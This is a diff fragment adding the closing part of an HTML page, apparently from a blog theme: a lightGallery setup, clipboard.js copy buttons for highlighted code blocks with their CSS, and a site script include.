+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
